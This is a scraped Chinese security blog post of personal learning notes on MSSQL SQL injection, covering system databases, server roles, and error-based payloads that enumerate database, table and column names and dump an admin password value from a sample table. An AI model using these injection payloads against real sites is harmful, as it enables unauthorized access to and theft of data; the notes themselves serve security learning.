class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">sql注入学习--拓展</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-10-15T00:30:58.768Z" title="发表于 2023-10-15 08:30:58">2023-10-15</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-12-18T09:12:22.405Z" title="更新于 2023-12-18 17:12:22">2023-12-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">8.4k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>32分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="sql注入学习--拓展"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/10/15/sql-zhu-ru-tuo-zhan/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/10/15/sql-zhu-ru-tuo-zhan/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/10/15/sql-zhu-ru-tuo-zhan/"><header><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">sql注入学习--拓展</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-10-15T00:30:58.768Z" title="发表于 2023-10-15 08:30:58">2023-10-15</time><time itemprop="dateCreated datePublished" datetime="2023-12-18T09:12:22.405Z" title="更新于 2023-12-18 17:12:22">2023-12-18</time></header><h1 id="0x01-前言">0x01 前言</h1>
<p>撰写本篇的目的是为了进一步了解一下sql注入的其他类型，mssql、postgresql、db2等等，主要是认为了解且会用手工注入才是前提也是重点，不能完全利用工具。因此写下本文来记录常规的、常见的数据库类型的相关注入payload，让自己以后遇到的时候不会懵逼。</p>
<h1 id="0x02-msssql">0x02 Msssql</h1>
<h2 id="21-环境搭建">2.1 环境搭建</h2>
<p>哎呀，这一块看着真麻烦，我本是想能实操就实操一下，但这么麻烦感觉还是算了，我初心只是想了解一下语句emmm，那就多用脑子想想吧。</p>
<p>下面都是跟着y4er师傅学习的┭┮﹏┭┮太强啦！！！</p>
<h2 id="22-自带库介绍">2.2 自带库介绍</h2>
<pre><code class="hljs plaintext">master   //用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。

model    //SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础

msdb     //由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。

tempdb   //它为临时表和其他临时工作提供了一个存储区。</code></pre>
<p>其中最主要的是<code>master</code>数据库，其中存储了所有的数据库名等，还有很多<code>存储过程</code></p>
<blockquote>
<p>存储过程是一组为了完成特定功能的SQL 语句集，它存储在数据库中，一次编译后永久有效，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。实际上就是一个封装好的函数，具有面向对象特点。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015091759377.png" alt="image-20231015091759377"></p>
<p>在master数据库中有<code>master.dbo.sysdatabases</code>视图，储存所有数据库名,其他数据库的视图则储存他本库的表名与列名。 每一个库的视图表都有<code>syscolumns</code>存储着所有的字段，可编程性储存着我们的函数。</p>
<p>mssql的存储过程天然支持多语句，为我们的注入提供了遍历。</p>
<p>增删改查和MySQL数据库大同小异，具体可以自行w3c。</p>
<h2 id="23-信息搜集">2.3 信息搜集</h2>
<p>先来了解下mssql中有哪些角色/权限</p>
<p>以下摘自<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017">官网文档</a></p>
<p>这里留着日后有需要在查看，脑子里有个大概印象</p>
<table>
<thead>
<tr>
<th style="text-align:left">服务器级的固定角色</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">sysadmin</td>
<td style="text-align:left">sysadmin 固定服务器角色的成员可以在服务器上执行任何活动。</td>
</tr>
<tr>
<td style="text-align:left">serveradmin</td>
<td style="text-align:left">serveradmin 固定服务器角色的成员可以更改服务器范围的配置选项和关闭服务器。</td>
</tr>
<tr>
<td style="text-align:left">securityadmin</td>
<td style="text-align:left">securityadmin 固定服务器角色的成员可以管理登录名及其属性。 他们可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 服务器级权限。 他们还可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 数据库级权限（如果他们具有数据库的访问权限）。 此外，他们还可以重置 SQL Server 登录名的密码。 重要说明： 如果能够授予对 数据库引擎 的访问权限和配置用户权限，安全管理员可以分配大多数服务器权限。 securityadmin 角色应视为与 sysadmin 角色等效。</td>
</tr>
<tr>
<td style="text-align:left">processadmin</td>
<td style="text-align:left">processadmin 固定服务器角色的成员可以终止在 SQL Server 实例中运行的进程。</td>
</tr>
<tr>
<td style="text-align:left">setupadmin</td>
<td style="text-align:left">setupadmin 固定服务器角色的成员可以使用 Transact-SQL 语句添加和删除链接服务器。 （使用 Management Studio 时需要 sysadmin 成员资格。）</td>
</tr>
<tr>
<td style="text-align:left">bulkadmin</td>
<td style="text-align:left">bulkadmin 固定服务器角色的成员可以运行 <code>BULK INSERT</code> 语句。</td>
</tr>
<tr>
<td style="text-align:left">diskadmin</td>
<td style="text-align:left">diskadmin 固定服务器角色用于管理磁盘文件。</td>
</tr>
<tr>
<td style="text-align:left">dbcreator</td>
<td style="text-align:left">dbeator 固务器角色的成员可以创建、更改、删除和还原任何数据库。</td>
</tr>
<tr>
<td style="text-align:left">puic</td>
<td style="text-align:left">每个 SQL Server 登录名都属于 public 服务器角色。 如果未向某个服务器主体授予或拒绝对某个安全对象的特定权限，该用户将继承授予该对象的 public 角色的权限。 只有在希望所有用户都能使用对象时，才在对象上分配 Public 权限。 你无法更改具有 Public 角色的成员身份。 注意plic 与其他角色的实现方式不同，可通过 public 固定服务器角色授予、拒绝或调用权限。</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:left">固定数据库角色名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">db_owner</td>
<td style="text-align:left">db_owner 固定数据库角色的成员可以执行数据库的所有配置和维护活动，还可以删除 SQL Server中的数据库。 （在 SQL 数据库 和 SQL 数据仓库中，某些维护活动需要服务器级别权限，并且不能由 db_owners执行。）</td>
</tr>
<tr>
<td style="text-align:left">db_securityadmin</td>
<td style="text-align:left">db_securityadmin 固定数据库角色的成员可以仅修改自定义角色的角色成员资格、创建无登录名的用户和管理权限。 向此角色中添加主体可能会导致意外的权限升级。</td>
</tr>
<tr>
<td style="text-align:left">db_accessadmin</td>
<td style="text-align:left">db_accessadmin 固定数据库角色的成员可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限。</td>
</tr>
<tr>
<td style="text-align:left">db_backupoperator</td>
<td style="text-align:left">db_backupoperator 固定数据库角色的成员可以备份数据库。</td>
</tr>
<tr>
<td style="text-align:left">db_ddladmin</td>
<td style="text-align:left">db_ddladmin 固定数据库角色的成员可以在数据库中运行任何数据定义语言 (DDL) 命令。</td>
</tr>
<tr>
<td style="text-align:left">db_datawriter</td>
<td style="text-align:left">db_datawriter 固定数据库角色的成员可以在所有用户表中添加、删除或更改数据。</td>
</tr>
<tr>
<td style="text-align:left">db_datareader</td>
<td style="text-align:left">db_datareader 固定数据库角色的成员可以从所有用户表中读取所有数据。</td>
</tr>
<tr>
<td style="text-align:left">db_denydatawriter</td>
<td style="text-align:left">db_denydatawriter 固定数据库角色的成员不能添加、修改或删除数据库内用户表中的任何数据。</td>
</tr>
<tr>
<td style="text-align:left">db_denydatareader</td>
<td style="text-align:left">db_denydatareader 固定数据库角色的成员不能读取数据库内用户表中的任何数据。</td>
</tr>
</tbody>
</table>
<p>我们可以用<code>IS_SRVROLEMEMBER</code>来判断服务器级别的固定角色</p>
<table>
<thead>
<tr>
<th style="text-align:left">返回值</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">0</td>
<td style="text-align:left">login 不是 role 的成员。</td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left">login 是 role 的成员。</td>
</tr>
<tr>
<td style="text-align:left">NULL</td>
<td style="text-align:left">role 或 login 无效，或者没有查看角色成员身份的权限。</td>
</tr>
</tbody>
</table>
<p>构造语句</p>
<pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'sysadmin'</span>))

<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'serveradmin'</span>))

<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'setupadmin'</span>))

<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'securityadmin'</span>))

<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'diskadmin'</span>))

<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'bulkadmin'</span>))</code></pre>
<p>数据库级别的应用角色用<code>IS_MEMBER</code>函数判断</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> IS_MEMBER(<span class="hljs-string">'db_owner'</span>)</code></pre>
<p>再来看一些基本信息</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>; <span class="hljs-operator">/</span><span class="hljs-operator">/</span>版本
<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>;		<span class="hljs-operator">/</span><span class="hljs-operator">/</span>用户
<span class="hljs-keyword">SELECT</span> DB_NAME();	<span class="hljs-operator">/</span><span class="hljs-operator">/</span>当前数据库名，你可以用db_name(n)来遍历出所有的数据库
<span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@servername</span>;	<span class="hljs-operator">/</span><span class="hljs-operator">/</span>主机名</code></pre>
<p>那么站库分离可以这么来判断</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">'1'</span><span class="hljs-keyword">and</span> host_name()<span class="hljs-operator">=</span>@<span class="hljs-variable">@servername</span>;<span class="hljs-comment">--'</span></code></pre>
<h2 id="24-符号">2.4 符号</h2>
<p>注释符</p>
<pre><code class="hljs plaintext">/* 
--
;%00</code></pre>
<p>空白符号</p>
<pre><code class="hljs plaintext">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20	--暂时不了解为什么

/**/</code></pre>
<p>运算</p>
<pre><code class="hljs sql"><span class="hljs-comment">--基本的不列举了，举几个特殊的</span>
<span class="hljs-keyword">ALL</span> 如果一组的比较都为<span class="hljs-literal">true</span>，则比较结果为<span class="hljs-literal">true</span>
<span class="hljs-keyword">AND</span> 如果两个布尔表达式都为<span class="hljs-literal">true</span>，则结果为<span class="hljs-literal">true</span>；如果其中一个表达式为<span class="hljs-literal">false</span>，则结果为<span class="hljs-literal">false</span>
<span class="hljs-keyword">ANY</span> 如果一组的比较中任何一个为<span class="hljs-literal">true</span>，则结果为<span class="hljs-literal">true</span>
<span class="hljs-keyword">BETWEEN</span> 如果操作数在某个范围之内，那么结果为<span class="hljs-literal">true</span>
<span class="hljs-keyword">EXISTS</span>  如果子查询中包含了一些行，那么结果为<span class="hljs-literal">true</span>
<span class="hljs-keyword">IN</span>  如果操作数等于表达式列表中的一个，那么结果为<span class="hljs-literal">true</span>
<span class="hljs-keyword">LIKE</span>    如果操作数与某种模式相匹配，那么结果为<span class="hljs-literal">true</span>
<span class="hljs-keyword">NOT</span> 对任何其他布尔运算符的结果值取反
<span class="hljs-keyword">OR</span>  如果两个布尔表达式中的任何一个为<span class="hljs-literal">true</span>，那么结果为<span class="hljs-literal">true</span>
<span class="hljs-keyword">SOME</span>    如果在一组比较中，有些比较为<span class="hljs-literal">true</span>，那么结果为<span class="hljs-literal">true</span></code></pre>
<h2 id="25-基本注入流程">2.5 基本注入流程</h2>
<p>此处利用mssql数据类型不一样比较报错，爆出当前数据库名</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> DB_NAME()<span class="hljs-operator">&gt;</span><span class="hljs-number">1</span>;</code></pre>
<p>在将 nvarchar 值 ‘FanmvCMS’ 转换成数据类型 int 时失败。</p>
<p>爆表名</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">SELECT</span> TOP <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> sysobjects <span class="hljs-keyword">WHERE</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">'u'</span>);</code></pre>
<p>在将 nvarchar 值 ‘Fanmv_Admin’ 转换成数据类型 int 时失败。</p>
<p>此处<code>xtype</code>可以是下列对象类型中的一种：</p>
<table>
<thead>
<tr>
<th style="text-align:center">缩写</th>
<th style="text-align:left">全称</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">C</td>
<td style="text-align:left">CHECK 约束</td>
</tr>
<tr>
<td style="text-align:center">D</td>
<td style="text-align:left">默认值或 DEFAULT 约束</td>
</tr>
<tr>
<td style="text-align:center">F</td>
<td style="text-align:left">FOREIGN KEY 约束</td>
</tr>
<tr>
<td style="text-align:center">L</td>
<td style="text-align:left">日志</td>
</tr>
<tr>
<td style="text-align:center">FN</td>
<td style="text-align:left">标量函数</td>
</tr>
<tr>
<td style="text-align:center">IF</td>
<td style="text-align:left">内嵌表函数</td>
</tr>
<tr>
<td style="text-align:center">P</td>
<td style="text-align:left">存储过程</td>
</tr>
<tr>
<td style="text-align:center">PK</td>
<td style="text-align:left">PRIMARY KEY 约束（类型是 K）</td>
</tr>
<tr>
<td style="text-align:center">RF</td>
<td style="text-align:left">复制筛选存储过程</td>
</tr>
<tr>
<td style="text-align:center">S</td>
<td style="text-align:left">系统表</td>
</tr>
<tr>
<td style="text-align:center">TF</td>
<td style="text-align:left">表函数</td>
</tr>
<tr>
<td style="text-align:center">TR</td>
<td style="text-align:left">触发器</td>
</tr>
<tr>
<td style="text-align:center">U</td>
<td style="text-align:left">用户表</td>
</tr>
<tr>
<td style="text-align:center">UQ</td>
<td style="text-align:left">UNIQUE 约束（类型是 K）</td>
</tr>
<tr>
<td style="text-align:center">V</td>
<td style="text-align:left">视图</td>
</tr>
<tr>
<td style="text-align:center">X</td>
<td style="text-align:left">扩展存储过程</td>
</tr>
</tbody>
</table>
<p>此处的<code>sysobjects</code>等同于<code>[master].[sys].[objects]</code></p>
<p>爆列名</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> syscolumns <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> sysobjects <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'Fanmv_Admin'</span>));</code></pre>
<p>在将 nvarchar 值 ‘AdminID’ 转换成数据类型 int 时失败。</p>
<blockquote>
<p>[22018] [Microsoft][SQL Server Native Client 10.0][SQL Server]在将 nvarchar 值 ‘AdminID’ 转换成数据类型 int 时失败。 (245)</p>
</blockquote>
<p>爆数据</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">SELECT</span> TOP <span class="hljs-number">1</span> AdminPass <span class="hljs-keyword">from</span> Fanmv_Admin);</code></pre>
<p>在将 varchar 值 ‘81FAAEN52MA16VBYT4Y1JJ3552BTC1640E7CF84345C86BA6’ 转换成数据类型 int 时失败。</p>
<p>当然，在mssql中也存在<code>INFORMATION_SCHEMA</code>，你也可以通过它来查询。</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> INFORMATION_SCHEMA.TABLES
<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> INFORMATION_SCHEMA.COLUMNS <span class="hljs-keyword">where</span> TABLE_NAME<span class="hljs-operator">=</span><span class="hljs-string">'admin'</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> table_name <span class="hljs-keyword">from</span> information_schema.tables);<span class="hljs-comment">--</span></code></pre>
<p>判断表名更方便的一种方式是使用<code>having 1=1</code>，GROUP BY</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">having</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></code></pre>
<p>选择列表中的列 ‘Fanmv_Admin.AdminID’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
<p>爆出一列，将其用group by 拼接进去继续往后爆其他的</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> AdminID <span class="hljs-keyword">having</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></code></pre>
<p>选择列表中的列 ‘Fanmv_Admin.IsSystem’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Fanmv_Admin <span class="hljs-keyword">WHERE</span> AdminID<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> AdminID,IsSystem <span class="hljs-keyword">having</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></code></pre>
<p>选择列表中的列 ‘Fanmv_Admin.AdminName’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
<p>以此爆出所有字段</p>
<h2 id="26-报错注入">2.6 报错注入</h2>
